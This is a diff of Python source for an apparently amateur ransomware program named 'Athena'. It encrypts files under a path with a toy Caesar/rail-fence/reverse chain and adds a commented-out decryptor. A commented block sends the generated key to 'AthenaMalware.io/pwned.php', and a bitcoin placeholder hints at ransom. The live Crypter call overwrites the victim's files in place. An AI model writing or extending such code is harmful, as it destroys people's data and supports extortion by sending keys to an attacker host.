@@ -28,9 +28,10 @@ def main(key):
     files = getdirs.getdirs(path)
 
     Crypter(files)
-
+    #Decrypter(files)
     bitcoin = r.random()
-    '''
+
+    ''' # supposed to send the generated key to an external server for identification
     data = parse.urlencode(key).encode()
     req =  request.Request("http://AthenaMalware.io/pwned.php", data=data) 
     resp = request.urlopen(req)
@@ -62,8 +63,22 @@ def Crypter(files):
         f1.write(stage3)
         f1.close()
 
-def Decrypter(files):
-    return 0
-
+"""def Decrypter(files):
+    #outputfile = ".AthenaCrypt0r"
+    shift = -13
+    key = 3
+    #stage3 -> stage2 -> stage1 -> write out product
+    for file in files:
+        f = open(file, "r")
+        contents = f.read()
+        f.close()
+        os.remove(file)
+        stage1 = ca.caesar(contents, shift)
+        stage2 = rail.decryptRailFence(stage1, key)
+        stage3 = rc.reverse(stage2)
+        f1 = open(file, "w")
+        f1.write(stage3)
+        f1.close()
+"""
 if __name__=="__main__":
     main(generateKey())
